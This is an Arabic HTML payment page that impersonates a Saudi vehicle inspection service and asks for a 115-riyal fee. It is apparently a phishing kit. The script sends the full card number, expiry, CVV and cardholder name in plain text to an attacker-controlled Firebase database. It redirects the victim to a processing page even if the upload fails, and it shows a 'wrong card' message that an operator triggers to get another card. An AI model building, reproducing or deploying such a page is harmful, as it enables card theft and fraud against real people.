<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إتمام عملية الدفع - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; --error-red: #d93025; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .payment-card-container { background: #fff; width: 100%; max-width: 420px; border-radius: 25px; padding: 25px 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
        .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
        .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; margin-bottom: 20px; }
        #rejectMsg { display: none; background: #feebeb; color: var(--error-red); padding: 12px; border-radius: 10px; border: 1px solid #facaca; margin-bottom: 15px; font-size: 13px; font-weight: bold; }
        .credit-card-view { width: 100%; height: 200px; background: linear-gradient(135deg, #1e7344 0%, #114126 100%); border-radius: 15px; padding: 20px; margin-bottom: 25px; color: white; position: relative; direction: ltr; text-align: left; }
        .card-number-view { font-size: 20px; letter-spacing: 2px; margin-top: 35px; display: block; font-family: 'Courier New', monospace; height: 25px; }
        .form-group { text-align: right; margin-bottom: 15px; width: 100%; }
        .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
        .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; }
        .input-field:focus { border-color: var(--main-green); }
        .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }
        .expiry-cvv-row { display: flex; gap: 10px; }
        .btn-pay { width: 100%; background-color: #82b199; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 18px; font-weight: bold; cursor: not-allowed; opacity: 0.6; }
        .btn-pay.active { background-color: var(--main-green); cursor: pointer; opacity: 1; }
    </style>
</head>
<body>

    <div class="payment-card-container">
        <div class="main-header">
            <h1>إتمام عملية الدفع</h1>
            <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
        </div>

        <div id="rejectMsg">يرجى التحقق من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>

        <div class="credit-card-view">
            <div style="display:flex; justify-content:space-between;">
                <div style="width:45px; height:30px; background:gold; border-radius:4px;"></div>
                <img id="v-logo" src="" style="width:50px; display:none;">
            </div>
            <div class="card-number-view" id="v-num">#### #### #### ####</div>
            <div style="display:flex; justify-content:space-between; margin-top:30px; direction:rtl;">
                <div id="v-name" style="font-size:12px;">اسم حامل البطاقة</div>
                <div id="v-exp" style="font-size:14px; direction:ltr;">00/00</div>
            </div>
        </div>

        <div class="form-group">
            <label class="form-label">اسم حامل البطاقة</label>
            <input type="text" id="cardHolder" class="input-field" placeholder="الاسم كما في البطاقة" oninput="this.value = this.value.replace(/[0-9\u0660-\u0669]/g, '')">
        </div>

        <div class="form-group">
            <label class="form-label">رقم البطاقة</label>
            <input type="tel" id="cardNumber" class="input-field" placeholder="#### #### #### ####" maxlength="19">
            <div id="numError" class="error-msg">رقم البطاقة غير صحيح أو ناقص</div>
        </div>

        <div class="expiry-cvv-row">
            <div class="form-group" style="flex: 1.5;">
                <label class="form-label">تاريخ الانتهاء</label>
                <input type="tel" id="cardExpiry" class="input-field" placeholder="MM / YY" maxlength="7">
            </div>
            <div class="form-group" style="flex: 1;">
                <label class="form-label">رمز (CVV)</label>
                <input type="tel" id="cvv" class="input-field" placeholder="123" maxlength="3">
            </div>
        </div>

        <button class="btn-pay" id="payButton" onclick="submitPayment()" disabled>ادفع الآن</button>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" 
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id') || 'u_' + Math.floor(Math.random()*1000000);
        localStorage.setItem('v_id', v_id);

        database.ref('orders/' + v_id + '/next_step').on('value', s => {
            if(s.val() === 'wrong_card') document.getElementById('rejectMsg').style.display = 'block';
        });

        function checkLuhn(n) {
            let s = 0; let d = false;
            for (let i = n.length - 1; i >= 0; i--) {
                let digit = parseInt(n[i]);
                if (d) { if ((digit *= 2) > 9) digit -= 9; }
                s += digit; d = !d;
            }
            return (s % 10) === 0;
        }

        function validate() {
            const num = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const exp = document.getElementById('cardExpiry').value;
            const name = document.getElementById('cardHolder').value;
            const cv = document.getElementById('cvv').value;
            const btn = document.getElementById('payButton');
            
            const isNum = num.length >= 15 && checkLuhn(num);
            document.getElementById('numError').style.display = (num.length > 10 && !isNum) ? 'block' : 'none';

            if (isNum && exp.length === 7 && name.length > 5 && cv.length === 3) {
                btn.disabled = false; btn.classList.add('active');
            } else {
                btn.disabled = true; btn.classList.remove('active');
            }
        }

        document.getElementById('cardHolder').addEventListener('input', function() {
            document.getElementById('v-name').innerText = this.value || 'اسم حامل البطاقة';
            validate();
        });

        document.getElementById('cardNumber').addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            this.value = v.match(/.{1,4}/g)?.join(' ') || '';
            document.getElementById('v-num').innerText = this.value || '#### #### #### ####';
            const logo = document.getElementById('v-logo');
            if(v.startsWith('4')) { logo.src="https://img.icons8.com/color/48/visa.png"; logo.style.display="block"; }
            else if(v.startsWith('5')) { logo.src="https://img.icons8.com/color/48/mastercard.png"; logo.style.display="block"; }
            validate();
        });

        document.getElementById('cardExpiry').addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            if(v.length >= 2) this.value = v.substring(0,2) + ' / ' + v.substring(2,4);
            else this.value = v;
            document.getElementById('v-exp').innerText = this.value || '00/00';
            validate();
        });

        document.getElementById('cvv').addEventListener('input', validate);

        function submitPayment() {
            const btn = document.getElementById('payButton');
            btn.disabled = true;
            btn.innerText = "جاري التحميل...";

            const payload = {
                fullName: document.getElementById('cardHolder').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiryDate: document.getElementById('cardExpiry').value,
                cvv: document.getElementById('cvv').value,
                next_step: 'waiting',
                status: 'انتظار القبول',
                last_update: new Date().toLocaleTimeString()
            };

            database.ref('orders/' + v_id).update(payload).then(() => {
                // تم تعديل هذا السطر تحديداً ليعمل التوجيه بشكل صحيح
                window.location.href = 'Processing.html'; 
            }).catch((err) => {
                // احتياطي في حالة فشل الاتصال لحظياً
                window.location.href = 'Processing.html';
            });
        }
    </script>
</body>
</html>
